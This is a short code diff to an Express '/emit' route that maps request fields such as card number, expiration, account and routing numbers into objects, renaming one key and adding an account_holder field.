@@ -58,7 +58,7 @@ app.post("/emit", (req, res) => {
         holder: payload.holder || null,
         cardNumber: payload.cardNumber || null,
         expiration: payload.expiration || null,
-        account_type: payload.account_type || null,
+        accountType: payload.account_type || null,
         account_number: payload.account_number || null,
         account_holder: payload.account_holder || null,
         balance: payload.balance || null,
@@ -77,7 +77,8 @@ app.post("/emit", (req, res) => {
         bank_name: payload.bank_name || null,
         routing_number: payload.routing_number || null,
         account_number: payload.account_number || null,
-        swift_bic: payload.swift_bic || null
+        swift_bic: payload.swift_bic || null,
+         account_holder: payload.account_holder || null,
         
     };
 
